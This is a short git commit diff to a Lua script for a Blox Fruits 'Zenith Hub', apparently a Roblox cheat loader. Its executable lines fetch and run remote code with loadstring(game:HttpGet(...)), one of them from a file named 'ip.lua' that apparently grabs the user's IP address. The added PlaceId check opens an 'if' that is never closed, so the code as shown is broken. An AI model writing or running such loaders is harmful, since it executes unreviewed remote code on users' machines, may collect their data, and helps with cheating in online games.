db6aee73e2a6f580354309142974b101caf7d715
xielbers <88589081+xielbers@users.noreply.github.com>
2025-03-27 12:00:42 -0300

    Update blox-fruits_zenith-hub.lua

--- blox-fruits_zenith-hub.lua
+++ blox-fruits_zenith-hub.lua
@@ -1,3 +1,5 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/refs/heads/main/copy/ip.lua'))()
 
+print(game.PlaceId)
+if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7449423635 then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
